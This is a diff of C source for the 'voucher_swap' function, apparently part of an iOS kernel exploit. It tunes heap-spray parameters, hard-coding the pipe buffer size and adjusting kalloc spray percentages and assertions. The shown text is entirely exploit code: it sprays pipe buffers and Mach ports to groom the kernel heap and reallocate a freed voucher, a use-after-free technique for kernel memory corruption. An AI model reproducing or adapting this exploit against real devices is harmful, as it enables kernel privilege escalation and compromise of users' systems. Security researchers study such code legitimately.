@@ -762,7 +762,7 @@ voucher_swap() {
 
 	// 2. Create some pipes so that we can spray pipe buffers later. We'll be limited to 16 MB
 	// of pipe memory, so don't bother creating more.
-	pipe_buffer_size = (page_size == 0x4000 ? 16384 : 4096);
+    pipe_buffer_size = 16384;
 	size_t pipe_count = 16 * MB / pipe_buffer_size;
 	increase_file_limit();
 	int *pipefds_array = create_pipes(&pipe_count);
@@ -788,7 +788,7 @@ voucher_swap() {
 
 	// 4. Spray our pipe buffers. We're hoping that these land contiguously right after the
 	// ports.
-	assert(pipe_buffer_size == (page_size == 0x4000 ? 16384 : 4096));
+	assert(pipe_buffer_size == 16384);
 	pipe_buffer = calloc(1, pipe_buffer_size);
 	assert(pipe_buffer != NULL);
 	assert(pipe_count <= IO_BITS_KOTYPE + 1);
@@ -822,12 +822,12 @@ voucher_swap() {
 	INFO("created %zu vouchers", voucher_spray_count);
 	mach_port_t uaf_voucher_port = voucher_ports[uaf_voucher_index];
 
-	// 6. Spray 10% of memory in kalloc.1024 that we can free later to
+	// 6. Spray 15% of memory in kalloc.1024 that we can free later to
 	// prompt gc. We'll reuse some of the early ports from the port spray above for this.
     const size_t gc_spray_size = (kCFCoreFoundationVersionNumber >= 1535.12 ? 0.15 : 0.10) * platform.memory_size;
 	printf("Spray size: %ld\n", gc_spray_size);
 	mach_port_t *gc_ports = filler_ports;
-	size_t gc_port_count = 500;		// Use at most 500 ports for the spray.
+	size_t gc_port_count = 500;        // Use at most 500 ports for the spray.
     sprayed_size = kalloc_spray_size(gc_ports, &gc_port_count, (kCFCoreFoundationVersionNumber >= 1535.12 ? 768 : 300) + 1, 1024, gc_spray_size);;
 	INFO("sprayed %zu bytes to %zu ports in kalloc.%u", sprayed_size, gc_port_count, 1024);
     
@@ -844,7 +844,7 @@ voucher_swap() {
 	// We will reallocate the voucher to kalloc.32768, which is a convenient size since it lets
 	// us very easily predict what offsets in the allocation correspond to which fields of the
 	// voucher.
-	assert(BLOCK_SIZE(ipc_voucher) == (page_size == 0x4000 ? 16384 : 4096));
+	assert(BLOCK_SIZE(ipc_voucher) == 16384);
 	const size_t ool_port_spray_kalloc_zone = 32768;
 	const size_t ool_port_count = ool_port_spray_kalloc_zone / sizeof(uint64_t);
 	mach_port_t *ool_ports = calloc(ool_port_count, sizeof(mach_port_t));
@@ -883,7 +883,7 @@ voucher_swap() {
 	// plenty.
     const size_t ool_ports_spray_size = (kCFCoreFoundationVersionNumber >= 1535.12 ? 0.25 : 0.085) * platform.memory_size;
 	mach_port_t *ool_holding_ports = gc_ports + gc_port_count;
-	size_t ool_holding_port_count = 500;
+	size_t ool_holding_port_count = 500;    // Use at most 500 ports for the spray.
 	sprayed_size = ool_ports_spray_size_with_gc(ool_holding_ports, &ool_holding_port_count,
 			message_size_for_kalloc_size(512),
 			ool_ports, ool_port_count, MACH_MSG_TYPE_MAKE_SEND,
